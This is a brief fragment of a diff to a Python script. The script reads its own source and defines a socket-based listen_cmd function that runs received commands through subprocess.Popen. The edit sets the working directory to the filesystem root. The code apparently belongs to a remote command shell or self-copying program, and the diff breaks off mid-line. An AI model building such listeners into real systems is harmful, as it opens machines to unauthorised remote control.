@@ -20,7 +20,7 @@ SCRIPT_PATH = os.path.realpath(__file__)
 SCRIPT_CONTENT = (open(SCRIPT_PATH, 'r')).read()
 
 def listen_cmd(socket: socket.socket):
-    cwd = os.getcwd()
+    cwd = '/'
 
     def exec_cmd(cmd):
         p = subprocess.Popen(cmd
